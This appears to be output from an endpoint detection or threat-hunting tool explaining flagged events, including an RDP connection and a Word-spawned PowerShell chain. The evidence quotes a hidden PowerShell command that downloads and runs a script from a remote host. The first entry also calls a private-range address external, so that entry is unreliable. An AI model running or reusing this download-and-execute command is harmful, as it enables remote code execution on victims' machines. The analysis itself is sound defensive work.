explanation:
Attack: Remote desktop connection initiated from the workstation to an external IP address.
Why this event: The outbound connection from mstsc.exe to 10.47.35.74:3389 is unusual as mstsc.exe has not used port 3389 on this machine in the last hour.
Chain: explorer.exe -> mstsc.exe, explorer.exe started mstsc.exe at 13:54:16.
Evidence: mstsc.exe started at 13:54:16 as sysadmin (domain SYSTEMIACOM) and made an outbound connection to 10.47.35.74:3389 at 13:54:36.

Attack: Malicious PowerShell execution initiated via Microsoft Word.
Why this event: The execution of PowerShell with encoded commands and hidden window flags from a Microsoft Word process is highly suspicious.
Chain: outlook.exe -> winword.exe -> cmd.exe -> powershell.exe
Evidence: At 10:39:40, cmd.exe was launched by winword.exe with the command line: C:\Windows\System32\cmd.exe /k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://news.com:8000/default.ps1');powershell -noP -sta -w 1 -enc $e.

Attack: Execution of an encoded PowerShell command via a nested PowerShell process.
Why this event: The use of the -EncodedCommand flag combined with a hidden window and -NoProfile indicates obfuscated and potentially malicious execution.
Chain: cmd.exe -> powershell.exe -> powershell.exe, where cmd.exe launched the initial powershell.exe, which then launched a second powershell.exe with the encoded command.
Evidence: 10:39:40 cmd.exe started powershell.exe with the command line: "powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://news.com…"; 10:39:48 powershell.exe connected to 132.197.158.98:8000.

Attack: Remote download and execution of a PowerShell script from an external IP address.
Why this event: The execution of a hidden PowerShell command that downloads content from an external URL is indicative of malicious activity.
Chain: cmd.exe -> powershell.exe -> powershell.exe (outbound connection)
Evidence: 10:39:40 cmd.exe started powershell.exe with command: powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://news.com…'; 10:39:48 Outbound connection: powershell.exe → 132.197.158.98:8000.
